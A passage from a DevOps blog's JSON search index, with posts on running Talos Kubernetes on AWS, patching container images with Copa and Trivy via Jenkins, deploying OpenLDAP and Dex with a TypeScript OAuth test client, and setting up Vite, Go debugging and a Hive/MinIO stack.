7TARGET_GROUP_ARN=\u0026#34;arn:aws:elasticloadbalancing:us-east-1:xxxxx:targetgroup/talos-aws-tutorial-tg/xxxxx\u0026#34; Resolution the custom domain CNAME to load blancer Generate the config file 1 talosctl gen config talos-k8s-aws-tutorial https://talos.test-aws.dev:443 --with-examples=false --with-docs=false 2 talosctl validate --config controlplane.yaml --mode cloud 3 talosctl validate --config worker.yaml --mode cloud Create the control plane nodes 1CP_COUNT=1 2while [[ \u0026#34;$CP_COUNT\u0026#34; -lt 4 ]]; do 3 aws ec2 run-instances \\ 4 --region $REGION \\ 5 --image-id $AMI \\ 6 --count 1 \\ 7 --instance-type t3.small \\ 8 --user-data file://controlplane.yaml \\ 9 --subnet-id $SUBNET \\ 10 --security-group-ids $SECURITY_GROUP \\ 11 --tag-specifications \u0026#34;ResourceType=instance,Tags=[{Key=Name,Value=talos-aws-tutorial-cp-$CP_COUNT}]\u0026#34; 12 ((CP_COUNT++)) 13done Create the worker nodes 1aws ec2 run-instances \\ 2 --region $REGION \\ 3 --image-id $AMI \\ 4 --count 3 \\ 5 --instance-type t3.small \\ 6 --user-data file://worker.yaml \\ 7 --subnet-id $SUBNET \\ 8 --security-group-ids $SECURITY_GROUP \\ 9 --tag-specifications \u0026#34;ResourceType=instance,Tags=[{Key=Name,Value=talos-aws-tutorial-worker}]\u0026#34; Bootstrap Etcd 1talosctl --talosconfig talosconfig config endpoint \u0026lt;control plane 1 PUBLIC IP\u0026gt; 2talosctl --talosconfig talosconfig config node \u0026lt;control plane 1 PUBLIC IP\u0026gt; 3talosctl --talosconfig talosconfig bootstrap Retrive the kubeconfig 1# talosctl --nodes x.x.x.x kubeconfig 2# create the kubeconfig from one of controle plane 3talosctl --talosconfig talosconfig kubeconfig . 4 5# view the services logs 6talosctl -n 1.1.1.0 --talosconfig talosconfig services 7#view the dmesg logs 8talosctl -n 172.20.1.2 dmesg 9# edit the machineconfig 10talosctl edit machineconfig --talosconfig talosconfig -n 1.1.1.2 Useful commands 1# check etcd status 2alosctl --talosconfig talosconfig -n \u0026lt;CP1\u0026gt;,\u0026lt;CP2\u0026gt;,\u0026lt;CP3\u0026gt; etcd status 3# patch the machineconfig 4# cluster: 5# apiServer: 6# admissionControl: 7# - name: PodSecurity 8# configuration: 9# exemptions: 10# namespaces: 11# - rook-ceph 12# - kube-system 13talosctl patch --mode=no-reboot machineconfig --talosconfig talosconfig -n 1.1.1.2 --patch @ceph-patch.yaml 14 15# copy config to default folder 16cp ./talosconfig ~/.talos/config 17# view all nodes status 18talosctl get members 19# view the pod security admission 20talosctl get admissioncontrolconfigs.kubernetes.talos.dev admission-control -o yaml 21# to allow the privileged to namespace 22kubectl label ns default pod-security.kubernetes.io/enforce=privileged ","link":"https://blog.wisekee.com/post/talos-k8s-aws/","section":"post","tags":["talos","K8s","aws"],"title":"Talos launch kubernetes in aws environment getting started "},{"body":"","link":"https://blog.wisekee.com/tags/copa/","section":"tags","tags":null,"title":"copa"},{"body":"","link":"https://blog.wisekee.com/tags/lima/","section":"tags","tags":null,"title":"lima"},{"body":"The steps for image patch pull the image use: nerdctl pull xxxxx scan the image vulnerable: TRIVY_DEBUG=true trivy image --timeout 10m --scanners vuln --vuln-type os --ignore-unfixed -f json -o ${JSON_FILE_NAME}.json ${IMAGE} patch the image: copa patch -r ${JSON_FILE_NAME}.json -i $IMAGE -t ${2} --addr unix:///run/user/501/buildkit-default/buildkitd.sock --timeout 20m Use lima to management the buildkit virtual machine installation the lima 1brew install lima 2# launch virtual machine use template, the template can: template://docker, template://k8s 3limactl create --name=default template://buildkit 4# stop the virtual machine 5limactl stop buildkit 6 7# in buildkit virtual machine run the containerd 8nerdctl run -d -p 0.0.0.0:80:80 --name nginx nginx:latest setting up the network can access from host 1brew install socket_vmnet 2# edit the lima network config to add the network and config the vmnet 3# set the path: socketVMNet: \u0026#34;/opt/homebrew/Cellar/socket_vmnet/1.1.4/bin/socket_vmnet\u0026#34; to socket_vmnet binary path 4vi $LIMA_HOME/_config/networks.yaml 5 6# edit the virtual machine yaml config add network section 7limactl edit buildkit 8# networks: 9# - lima: shared 10 11limactl sudoers \u0026gt;etc_sudoers.d_lima \u0026amp;\u0026amp; sudo install -o root etc_sudoers.d_lima \u0026#34;/private/etc/sudoers.d/lima\u0026#34; 12sudo /usr/libexec/ApplicationFirewall/socketfilterfw --unblock /usr/libexec/bootpd How to upgrade the package for security patch in Debian os 1# find some packages 2dpkg -l | grep glib2.0 3# find upgrade versions 4apt-cache madison libglib2.0-0:amd64 5# libglib2.0-0 | 2.66.8-1+deb11u3 | http://security.debian.org/debian-security bullseye-security/main amd64 Packages 6# libglib2.0-0 | 2.66.8-1+deb11u1 | http://deb.debian.org/debian bullseye/main amd64 Packages 7# installation the new versions for patch 8apt-get install libglib2.0-0=2.66.8-1+deb11u3 The lima virtual machine config file example 1# Review and modify the following configuration for Lima instance \u0026#34;buildkit\u0026#34;. 2arch: \u0026#34;x86_64\u0026#34; 3# - To cancel starting Lima, just save this file as an empty file. 4 5# A template to use BuildKit 6# $ limactl start ./buildkit.yaml 7 8# To run `buildkit` on the host (assumes buildctl is installed): 9# $ export BUILDKIT_HOST=$(limactl list buildkit --format \u0026#39;unix://{{.Dir}}/sock/buildkitd.sock\u0026#39;) 10# $ buildctl debug workers 11message: | 12 To run `buildkit` on the host (assumes buildctl is installed), run the following commands: 13 ------- 14 export BUILDKIT_HOST=\u0026#34;unix://{{.Dir}}/sock/buildkitd.sock\u0026#34; 15 buildctl debug workers 16 ------- 17images: 18 # Try to use release-yyyyMMdd image if available. Note that release-yyyyMMdd will be removed after several months. 19 - location: \u0026#34;https://cloud-images.ubuntu.com/releases/23.10/release-20240307/ubuntu-23.10-server-cloudimg-amd64.img\u0026#34; 20 arch: \u0026#34;x86_64\u0026#34; 21 digest: \u0026#34;sha256:415123eb3b3ba1841e39a25d0dd82da43f968c7625b9cdf6312235b9b8ec17e9\u0026#34; 22 - location: \u0026#34;https://cloud-images.ubuntu.com/releases/23.10/release-20240307/ubuntu-23.10-server-cloudimg-arm64.img\u0026#34; 23 arch: \u0026#34;aarch64\u0026#34; 24 digest: \u0026#34;sha256:373e8866d33909b283b14c86c18f8a48844c8f9fe6aed3ca280288846fc4fb74\u0026#34; 25 # Fallback to the latest release image. 26 # Hint: run `limactl prune` to invalidate the cache 27 - location: \u0026#34;https://cloud-images.ubuntu.com/releases/23.10/release/ubuntu-23.10-server-cloudimg-amd64.img\u0026#34; 28 arch: \u0026#34;x86_64\u0026#34; 29 - location: \u0026#34;https://cloud-images.ubuntu.com/releases/23.10/release/ubuntu-23.10-server-cloudimg-arm64.img\u0026#34; 30 arch: \u0026#34;aarch64\u0026#34; 31containerd: 32 system: false 33 user: true 34portForwards: 35 - guestSocket: \u0026#34;/run/user/{{.UID}}/buildkit-default/buildkitd.sock\u0026#34; 36 hostSocket: \u0026#34;{{.Dir}}/sock/buildkitd.sock\u0026#34; 37mountType: \u0026#34;reverse-sshfs\u0026#34; 38mounts: 39 - location: \u0026#34;~\u0026#34; 40 sshfs: 41 cache: null 42 followSymlinks: null 43 sftpDriver: null 44 writable: true 45networks: 46 - lima: shared Use Jenkins to run image scanning Prepare the Scanning Dockerfile to include: Copa, Trivy, AWS Cli 1FROM docker:27-dind 2 3ENV DOCKER_CLI_EXPERIMENTAL=enabled 4 5RUN apk update \\ 6 \u0026amp;\u0026amp; cd /tmp \\ 7 \u0026amp;\u0026amp; apk add aws-cli \\ 8 \u0026amp;\u0026amp; wget http://dl-cdn.alpinelinux.org/alpine/v3.20/community/x86_64/docker-credential-ecr-login-0.7.1-r19.apk \\ 9 \u0026amp;\u0026amp; apk add --allow-untrusted docker-credential-ecr-login-0.7.1-r19.apk \\ 10 \u0026amp;\u0026amp; wget https://github.com/aquasecurity/trivy/releases/download/v0.47.0/trivy_0.47.0_Linux-64bit.tar.gz \u0026amp;\u0026amp; tar -xzvf trivy_0.47.0_Linux-64bit.tar.gz \u0026amp;\u0026amp; mv ./trivy /usr/local/bin/ \\ 11 \u0026amp;\u0026amp; wget https://github.com/project-copacetic/copacetic/releases/download/v0.6.2/copa_0.6.2_linux_amd64.tar.gz \u0026amp;\u0026amp; tar -xzvf copa_0.6.2_linux_amd64.tar.gz \u0026amp;\u0026amp; mv ./copa /usr/local/bin/ \\ 12 \u0026amp;\u0026amp; rm -rf /tmp/* \\ 13 \u0026amp;\u0026amp; mkdir /etc/docker \u0026amp;\u0026amp; echo \u0026#39;{ \u0026#34;features\u0026#34;: { \u0026#34;containerd-snapshotter\u0026#34;: true } }\u0026#39; \u0026gt; /etc/docker/daemon.json 14 15RUN mkdir ~/.docker \\ 16 \u0026amp;\u0026amp; echo -e \u0026#34;{\\n\\\u0026#34;credHelpers\\\u0026#34;: { \\n \\\u0026#34;public.ecr.aws\\\u0026#34;: \\\u0026#34;ecr-login\\\u0026#34;,\\n \\\u0026#34;xxxxxxxx.dkr.ecr.us-east-1.amazonaws.com\\\u0026#34;: \\\u0026#34;ecr-login\\\u0026#34;\\n}}\u0026#34; \u0026gt; ~/.docker/config.json Configure the Jenkins clouds and create the Pod tempalte\nInclude the two Containers: docker-dind, jnlp The docker-dind container config: Docker image: from dockerfile build out the dind image in previous Command to run: dockerd-entrypoint.sh Working directory: /home/jenkins/agent Advanced: Run in privileged mode The jnlp container config: Docker image: jenkins/inbound-agent:latest-jdk11 Working directory: /home/jenkins/agent Command to run: /usr/local/bin/jenkins-agent Create the Jenkins task and to patch the ECR docker images\n1@Library(\u0026#39;common-lib\u0026#39;) 2 3def scanImage(imageUrl) { 4 sh \u0026#34;\u0026#34;\u0026#34; 5 TRIVY_DEBUG=true trivy image --cache-dir /tmp/trivy/ --timeout 10m --scanners vuln --vuln-type os --ignore-unfixed ${imageUrl} 6 \u0026#34;\u0026#34;\u0026#34; 7} 8 9node(\u0026#34;patch\u0026#34;) { 10 11 container(\u0026#39;docker-dind\u0026#39;) { 12 stage \u0026#34;pull the image: ${params.IMAGE_URL}\u0026#34; 13 sh \u0026#34;docker pull ${params.IMAGE_URL}\u0026#34; 14 15 stage \u0026#34;Scan the vulnerability\u0026#34; 16 def jsonFileName = params.IMAGE_URL.split(\u0026#34;/\u0026#34;)[-1].replace(\u0026#34;:\u0026#34;, \u0026#34;-\u0026#34;) 17 def oldImageTag = params.IMAGE_URL.split(\u0026#34;/\u0026#34;)[-1].split(\u0026#34;:\u0026#34;)[-1] 18 def imageName = params.IMAGE_URL.split(\u0026#34;:\u0026#34;)[0] 19 def newImageURL = \u0026#34;${imageName}:${oldImageTag}-${PATCH_TAG}\u0026#34; 20 sh \u0026#34;\u0026#34;\u0026#34; 21 TRIVY_DEBUG=true trivy image --cache-dir /tmp/trivy/ --timeout 10m --scanners vuln --vuln-type os --ignore-unfixed -f json -o ${jsonFileName}.json ${params.IMAGE_URL} 22 \u0026#34;\u0026#34;\u0026#34; 23 24 stage \u0026#34;Patch the image: ${params.IMAGE_URL}\u0026#34; 25 sh \u0026#34;\u0026#34;\u0026#34; 26 copa patch -r ${jsonFileName}.json -i ${params.IMAGE_URL} -t ${oldImageTag}-${PATCH_TAG} --timeout 20m 27 \u0026#34;\u0026#34;\u0026#34; 28 stage \u0026#34;Rescaning the new image: ${newImageURL}\u0026#34; 29 scanImage(newImageURL) 30 31 stage \u0026#34;Push the new image: ${newImageURL}\u0026#34; 32 sh \u0026#34;\u0026#34;\u0026#34; 33 docker push ${newImageURL} 34 \u0026#34;\u0026#34;\u0026#34; 35 36 } 37} Reference containerd image store with Docker Engine using-containerd-without-docker Debian tracker copa lima Securing Docker Images: A Guide to Patching and Vulnerability Management ","link":"https://blog.wisekee.com/post/copa-docker-image-patch/","section":"post","tags":["copa","lima"],"title":"Use Copa to patch the container images"},{"body":"","link":"https://blog.wisekee.com/tags/dex/","section":"tags","tags":null,"title":"Dex"},{"body":"Generate the PKI for openldap Caution: the certificate\u0026rsquo;s subject's domain component (DC) can with openldap DN same to name 1# install the certtool 2apt install gnutls-bin 3# generate the ca.key 4certtool --generate-privkey --outfile ca.key 5# generate the ca certificate 6certtool --generate-self-signed --load-privkey ca.key --outfile ca.crt 7# generate the server endpoint private key 8certtool --generate-privkey --outfile tls.key --rsa 9# server endpoint certificate request 10certtool --generate-request --load-privkey tls.key --outfile request.crt 11# use ca certificate to sign the server endpoint certificate 12certtool --generate-certificate --load-request request.crt --outfile tls.crt --load-ca-certificate ca.crt --load-ca-privkey ca.key Create the kubernetes secrets to serve the above certificates the data key is tls.crt, tls.key, ca.crt Launch the Openldap helm chart the image use only: jpgouin/openldap:2.6.7-fix about this issue: ldap_start_tls failed\n1 global: 2 ldapDomain: \u0026#34;dc=mycomp,dc=test\u0026#34; 3 image: 4 # repository: bitnami/openldap 5 # tag: 2.6.8 6 pullPolicy: IfNotPresent 7 replicaCount: 2 8 users: devloper,devops 9 userPasswords: test,test 10 group: dev-team 11 initSchema: 12 image: 13 pullPolicy: IfNotPresent 14 initTLSSecret: 15 tls_enabled: true 16 secret: \u0026#34;ldap-tls-secret\u0026#34; 17 logLevel: info 18 env: 19 BITNAMI_DEBUG: \u0026#34;true\u0026#34; 20 LDAP_LOGLEVEL: \u0026#34;256\u0026#34; 21 LDAP_TLS_ENFORCE: \u0026#34;false\u0026#34; 22 LDAPTLS_REQCERT: \u0026#34;allow\u0026#34; 23 LDAP_ENABLE_TLS: \u0026#34;yes\u0026#34; 24 LDAP_REQUIRE_TLS: \u0026#34;no\u0026#34; 25 LDAP_SKIP_DEFAULT_TREE: \u0026#34;no\u0026#34; 26 ltb-passwd: 27 image: 28 tag: 5.3.3 29 pullPolicy: IfNotPresent 30 ingress: 31 enabled: true 32 annotations: 33 kubernetes.io/ingress.class: nginx 34 hosts: 35 - \u0026#34;self-service.local.dev\u0026#34; 36 phpldapadmin: 37 image: 38 tag: 0.9.0 39 pullPolicy: IfNotPresent 40 ingress: 41 enabled: true 42 annotations: 43 kubernetes.io/ingress.class: nginx 44 hosts: 45 - \u0026#34;phpldap.local.dev\u0026#34; Deployment the dex use the official charts: Dex chart this the helm chart example values\n1 config: 2 issuer: https://dexidp.local.dev 3 storage: 4 type: kubernetes 5 config: 6 inCluster: true 7 connectors: 8 - type: ldap 9 name: OpenLDAP 10 id: ldap 11 config: 12 host: openldap:389 13 insecureNoSSL: true 14 bindDN: cn=admin,dc=talos,dc=test 15 bindPW: \u0026#34;{{.Env.LDAP_ADMIN_PASSWORD}}\u0026#34; 16 usernamePrompt: Email Address 17 userSearch: 18 baseDN: ou=users,dc=talos,dc=test 19 filter: \u0026#34;(objectClass=inetOrgPerson)\u0026#34; 20 username: mail 21 idAttr: DN 22 emailAttr: mail 23 nameAttr: cn 24 groupSearch: 25 baseDN: ou=users,dc=talos,dc=test 26 filter: \u0026#34;(objectClass=groupOfNames)\u0026#34; 27 userMatchers: 28 - userAttr: DN 29 groupAttr: member 30 nameAttr: cn 31 staticClients: 32 - id: headlamp 33 redirectURIs: 34 - \u0026#39;https://k8s.local.dev/oidc-callback\u0026#39; 35 name: \u0026#39;headlamp\u0026#39; 36 secret: \u0026#39;xxxxxxxxxxx\u0026#39; 37 envVars: 38 - name: LDAP_ADMIN_PASSWORD 39 valueFrom: 40 secretKeyRef: 41 name: \u0026#34;openldap\u0026#34; 42 key: \u0026#34;LDAP_ADMIN_PASSWORD\u0026#34; 43 ingress: 44 enabled: true 45 className: \u0026#34;nginx\u0026#34; 46 annotations: 47 kubernetes.io/ingress.class: nginx 48 hosts: 49 - host: dexidp.local.dev 50 paths: 51 - path: / 52 pathType: ImplementationSpecific Setup the kubernetes to use oidc create the user rolebinding 1kubectl create clusterrolebinding oidc-cluster-admin \\ 2 --clusterrole=cluster-admin \\ 3 --user=\u0026#34;admin1@example.org\u0026#34; enable the api server oidc feature 1 - \u0026#39;--oidc-client-id=headlamp\u0026#39; 2 - \u0026#39;--oidc-issuer-url=https://dexidp.local.dev\u0026#39; 3 - \u0026#39;--oidc-username-claim=email\u0026#39; user kubectl krew plugin to testing install the kubectl plugin management tool: krew 1# install the oidc-login 2kubectl krew install oidc-login 3# set up the oidc-login 4kubectl oidc-login setup --oidc-issuer-url=https://\u0026lt;YOUR-DEX-URL\u0026gt; \\ --oidc-client-id=\u0026lt;CLIENT-ID\u0026gt; \\ 5--oidc-client-secret=\u0026lt;CLIENT-SECRET\u0026gt; 6# set the credentials 7kubectl config set-credentials oidc-user \\ 8 --exec-api-version=client.authentication.k8s.io/v1beta1 \\ 9 --exec-command=kubectl \\ 10 --exec-arg=oidc-login \\ 11 --exec-arg=get-token \\ 12 --exec-arg=--oidc-issuer-url=\u0026lt;YOUR-DEX-URL\u0026gt; \\ 13 --exec-arg=--oidc-client-id=\u0026lt;CLIENT-ID\u0026gt; \\ 14 --exec-arg=--oidc-client-secret=\u0026lt;CLIENT-SECRET\u0026gt; \\ 15 --exec-arg=--oidc-extra-scope=email To debug and testing the openldap 1# test the tls connect to each other 2ldapsearch -x -H ldaps://openldap-1.openldap-headless.tools.svc.cluster.local:1636 -D \u0026#34;cn=admin,dc=mycomp,dc=test\u0026#34; -w \u0026#34;xxxxx\u0026#34; -b \u0026#34;cn=test,ou=users,dc=mycomp,dc=test\u0026#34; 3# Application integration the View detail oauth2.0 in dex configuration: https://dexidp.local.dev/.well-known/openid-configuration Add the staticClient to dex config 1staticClients: 2- id: local-app 3 name: local-app 4 redirectURIs: 5 - http://localhost:3000/oauth/callback 6 secret: xxxx Write client app to testing Oauth2 1\u0026lt;html\u0026gt; 2 \u0026lt;head\u0026gt; 3 \u0026lt;title\u0026gt;oauth walkthrough\u0026lt;/title\u0026gt; 4 \u0026lt;/head\u0026gt; 5 \u0026lt;body\u0026gt; 6 \u0026lt;a href=\u0026#34;/oauth/dex\u0026#34;\u0026gt;login with dex\u0026lt;/a\u0026gt; 7 \u0026lt;/body\u0026gt; 8\u0026lt;/html\u0026gt; The TypeScript code to implementation logic 1/* 2The workflow with dex use oauth2.0 31. When user click the index.html button: login with dex 42. Your website asks dex for permission 5 6*/ 7 8import express from \u0026#34;express\u0026#34;; 9import crypto from \u0026#34;crypto\u0026#34;; 10 11const PORT = 3000; 12const CLIENT_ID = process.env.CLIENT_ID as string; 13const CLIENT_SECRET = process.env.CLIENT_SECRET as string; 14 15const app = express(); 16 17app.use(express.static(\u0026#34;static\u0026#34;)); 18 19app.get(\u0026#34;/oauth/dex\u0026#34;, (req, res) =\u0026gt; { 20 const params = new URLSearchParams(); 21 22 params.set(\u0026#34;response_type\u0026#34;, \u0026#34;code\u0026#34;); 23 params.set(\u0026#34;client_id\u0026#34;, CLIENT_ID); 24 params.set(\u0026#34;redirect_uri\u0026#34;, \u0026#34;http://localhost:3000/oauth/callback\u0026#34;); 25 params.set(\u0026#34;scope\u0026#34;, \u0026#34;openid email\u0026#34;); 26 27 const state = crypto.randomBytes(16).toString(\u0026#34;hex\u0026#34;); 28 params.set(\u0026#34;state\u0026#34;, state); 29 30 const url = `https://dexidp.local.dev/auth?${params.toString()}`; 31 32 res.set(\u0026#34;Set-Cookie\u0026#34;, `oauth_state=${state}; HttpOnly; Secure; SameSite=Lax`); 33 res.redirect(url); 34}); 35 36app.get(\u0026#34;/oauth/callback\u0026#34;, async (req, res) =\u0026gt; { 37 const { code, state } = req.query; 38 const oauthState = getCookie(\u0026#34;oauth_state\u0026#34;, req.headers.cookie as string); 39 40 if (state !== oauthState) { 41 return res.status(400).send(\u0026#34;Invalid state\u0026#34;); 42 } 43 44 const jsonToken = await exchangeCodeForToken(code as string); 45 const userInfo = await getUserInfo(jsonToken); 46 47 res.header(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json\u0026#34;).send(JSON.stringify(userInfo)); 48 }); 49 50 app.listen(PORT, () =\u0026gt; { 51 console.log(`Example app listening at http://localhost:${PORT}`); 52 }); 53 54 function getCookie(name: string, cookies: string) { 55 const cookie = cookies.split(\u0026#34;;\u0026#34;).find((cookie) =\u0026gt; cookie.trim().startsWith(`${name}=`)); 56 if (!cookie) { 57 return null; 58 } 59 return cookie.split(\u0026#34;=\u0026#34;)[1]; 60 } 61 62 async function exchangeCodeForToken(code: string) { 63 const resp = await fetch(`https://dexidp.local.dev/token`, { 64 method: \u0026#34;POST\u0026#34;, 65 headers: { 66 \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, 67 }, 68 body: new URLSearchParams({ 69 grant_type: \u0026#34;authorization_code\u0026#34;, 70 code: code, 71 redirect_uri: \u0026#34;http://localhost:3000/oauth/callback\u0026#34;, 72 client_id: CLIENT_ID, 73 client_secret: CLIENT_SECRET, 74 }).toString(), 75 }); 76 77 if (!resp.ok) { 78 throw new Error(\u0026#34;Something went wrong\u0026#34;); 79 } 80 81 return resp.json() as Promise\u0026lt;{ access_token: string }\u0026gt;; 82 } 83 84 async function getUserInfo(jsonToken: string) { 85 console.log(jsonToken) 86 const resp = await fetch(`https://dexidp.local.dev/userinfo`, { 87 headers: { 88 Authorization: `Bearer ${jsonToken[\u0026#39;access_token\u0026#39;]}`, 89 }, 90 }); 91 92 return resp.json() as Promise\u0026lt;{ email: string }\u0026gt;; 93 } The package.json 1{ 2 \u0026#34;name\u0026#34;: \u0026#34;dex-test\u0026#34;, 3 \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, 4 \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, 5 \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, 6 \u0026#34;scripts\u0026#34;: { 7 \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34;, 8 \u0026#34;start\u0026#34;: \u0026#34;tsx index.ts\u0026#34; 9 }, 10 \u0026#34;dependencies\u0026#34;: { 11 \u0026#34;express\u0026#34;: \u0026#34;^4.18.2\u0026#34; 12 }, 13 \u0026#34;devDependencies\u0026#34;: { 14 \u0026#34;@types/express\u0026#34;: \u0026#34;^4.17.21\u0026#34;, 15 \u0026#34;@types/node\u0026#34;: \u0026#34;^20.11.19\u0026#34;, 16 \u0026#34;tsx\u0026#34;: \u0026#34;^4.7.1\u0026#34;, 17 \u0026#34;typescript\u0026#34;: \u0026#34;^5.3.3\u0026#34; 18 }, 19 \u0026#34;keywords\u0026#34;: [], 20 \u0026#34;author\u0026#34;: \u0026#34;\u0026#34;, 21 \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34; 22} to run CLIENT_SECRET=xxxxx CLIENT_ID=local-app pnpm run start Reference OpenLDAP container image openldap helm chart the docker image integration the dex with headlamp integrate k8s+dex+ldap ","link":"https://blog.wisekee.com/post/openldap-dex/","section":"post","tags":["Openldap","Dex"],"title":"Launch the openldap and dex in kubernetes"},{"body":"","link":"https://blog.wisekee.com/tags/openldap/","section":"tags","tags":null,"title":"Openldap"},{"body":"","link":"https://blog.wisekee.com/tags/frontend/","section":"tags","tags":null,"title":"frontend"},{"body":"","link":"https://blog.wisekee.com/tags/react/","section":"tags","tags":null,"title":"React"},{"body":"Install the bun 1HOMEBREW_NO_AUTO_UPDATE=1 brew install oven-sh/bun/bun Initialization the project use bun 1bun create vite@latest part1 --template react 2cd part1 3bun install 4bun run dev Or use the pnpm 1pnpm create vite@latest part1 --template react ","link":"https://blog.wisekee.com/post/vite-react-getting-started/","section":"post","tags":["Vite","Frontend","React"],"title":"To use the vite management the react project"},{"body":"","link":"https://blog.wisekee.com/tags/vite/","section":"tags","tags":null,"title":"Vite"},{"body":"","link":"https://blog.wisekee.com/tags/debug/","section":"tags","tags":null,"title":"Debug"},{"body":"","link":"https://blog.wisekee.com/tags/go/","section":"tags","tags":null,"title":"Go"},{"body":"To debug the go project has many method to achieve it\nThe config file specific the program arguments 1{ 2 // Use IntelliSense to learn about possible attributes. 3 // Hover to view descriptions of existing attributes. 4 // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 5 \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, 6 \u0026#34;configurations\u0026#34;: [ 7 { 8 \u0026#34;name\u0026#34;: \u0026#34;cmd-name\u0026#34;, 9 \u0026#34;type\u0026#34;: \u0026#34;go\u0026#34;, 10 \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, 11 \u0026#34;mode\u0026#34;: \u0026#34;auto\u0026#34;, 12 \u0026#34;program\u0026#34;: \u0026#34;src/cmd/main.go\u0026#34;, 13 \u0026#34;args\u0026#34;: [\u0026#34;aws\u0026#34;, \u0026#34;ecr\u0026#34;, \u0026#34;create-repository\u0026#34;, \u0026#34;--repository-name\u0026#34;, \u0026#34;test/repository\u0026#34;] 14 } 15 ] 16} Set the environment variables 1{ 2 // Use IntelliSense to learn about possible attributes. 3 // Hover to view descriptions of existing attributes. 4 // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 5 \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, 6 \u0026#34;configurations\u0026#34;: [ 7 { 8 \u0026#34;name\u0026#34;: \u0026#34;test-cmd\u0026#34;, 9 \u0026#34;type\u0026#34;: \u0026#34;go\u0026#34;, 10 \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, 11 \u0026#34;mode\u0026#34;: \u0026#34;auto\u0026#34;, 12 \u0026#34;env\u0026#34;: { 13 \u0026#34;ENVIRONMENT\u0026#34;: \u0026#34;dev\u0026#34; 14 }, 15 \u0026#34;program\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34;, 16 \u0026#34;dlvFlags\u0026#34;: [\u0026#34;--check-go-version=false\u0026#34;] 17 } 18 ] 19} ","link":"https://blog.wisekee.com/post/go-vscode-debug-config/","section":"post","tags":["Go","Debug","VsCode"],"title":"How to config debug the go project in vscode"},{"body":"","link":"https://blog.wisekee.com/tags/vscode/","section":"tags","tags":null,"title":"VsCode"},{"body":"","link":"https://blog.wisekee.com/tags/bigdata/","section":"tags","tags":null,"title":"bigdata"},{"body":"","link":"https://blog.wisekee.com/tags/hive/","section":"tags","tags":null,"title":"hive"},{"body":"","link":"https://blog.wisekee.com/tags/minio/","section":"tags","tags":null,"title":"minio"},{"body":"","link":"https://blog.wisekee.com/tags/open-source/","section":"tags","tags":null,"title":"open source"},{"body":"","link":"https://blog.wisekee.com/tags/trino/","section":"tags","tags":null,"title":"trino"},{"body":"\rMake the Hive images 1FROM openjdk:8u302 2 3WORKDIR /opt/hive 4ENV HADOOP_HOME=/opt/hadoop-3.2.3 5 6ADD ./hadoop-3.2.3 /opt/hadoop-3.2.3 7ADD ./apache-hive-3.1.3-bin /opt/hive 8ADD ./hadoop-3.2.3/share/hadoop/common/lib/guava-27.0-jre.jar /opt/hive/lib/ 9ADD ./hadoop-3.2.3/share/hadoop/tools/lib/hadoop-aws-3.2.3.jar /opt/hive/lib/ 10ADD ./hadoop-3.2.3/share/hadoop/tools/lib/aws-java-sdk-bundle-1.11.901.jar /opt/hive/lib/ 11 12RUN echo \u0026#39;export HIVE_HOME=/opt/hive \\n export HIVE_CONF_DIR=/opt/hive/conf \\n export PATH=$PATH:$HIVE_HOME/bin\u0026#39; \u0026gt;\u0026gt; ~/.bashrc 13# RUN curl https://jdbc.postgresql.org/download/postgresql-42.7.1.jar --output /opt/hive/lib/postgresql-42.7.1.jar 14RUN rm -rf /opt/hive/lib/guava-19.0.jar Define the docker-compose.yaml 1version: \u0026#39;3.7\u0026#39; 2services: 3 minio: 4 image: \u0026#39;minio/minio:latest\u0026#39; 5 hostname: minio 6 container_name: minio 7 ports: 8 - \u0026#39;9000:9000\u0026#39; 9 - \u0026#39;9001:9001\u0026#39; 10 volumes: 11 - ./minio-data:/data 12 environment: 13 MINIO_ACCESS_KEY: xxxx 14 MINIO_SECRET_KEY: xxxx 15 command: server --console-address \u0026#34;:9001\u0026#34; /data 16 networks: 17 - trino-network 18 19 postgres: 20 image: \u0026#39;postgres:11\u0026#39; 21 hostname: postgres 22 expose: 23 - \u0026#39;5432\u0026#39; 24 ports: 25 - \u0026#39;5431:5432\u0026#39; 26 volumes: 27 - ./hive-schema-3.1.0.sql:/docker-entrypoint-initdb.d/hive-schema-3.1.0.sql 28 environment: 29 POSTGRES_USER: xxxx 30 POSTGRES_PASSWORD: xxxx 31 POSTGRES_DB: hive_db 32 networks: 33 - trino-network 34 35 hive: 36 image: \u0026#39;hivems:3.1.2\u0026#39; 37 hostname: hive 38 ports: 39 - \u0026#39;9083:9083\u0026#39; # Metastore Thrift 40 command: [\u0026#34;/opt/hive/bin/hive\u0026#34;, \u0026#34;--service\u0026#34;, \u0026#34;metastore\u0026#34;] 41 volumes: 42 - ./hive-site.xml:/opt/hive/conf/hive-site.xml:ro 43 environment: 44 METASTORE_DB_HOSTNAME: postgres 45 METASTORE_TYPE: postgres 46 depends_on: 47 - postgres 48 networks: 49 - trino-network 50 51networks: 52 trino-network: 53 driver: bridge The hive-site.xml file content 1\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;no\u0026#34;?\u0026gt; 2\u0026lt;?xml-stylesheet type=\u0026#34;text/xsl\u0026#34; href=\u0026#34;configuration.xsl\u0026#34;?\u0026gt; 3\u0026lt;configuration\u0026gt; 4 \u0026lt;property\u0026gt; 5 \u0026lt;name\u0026gt;fs.s3a.access.key\u0026lt;/name\u0026gt; 6 \u0026lt;value\u0026gt;xxxx\u0026lt;/value\u0026gt; 7 \u0026lt;/property\u0026gt; 8 \u0026lt;property\u0026gt; 9 \u0026lt;name\u0026gt;fs.s3a.secret.key\u0026lt;/name\u0026gt; 10 \u0026lt;value\u0026gt;xxxx\u0026lt;/value\u0026gt; 11 \u0026lt;/property\u0026gt; 12 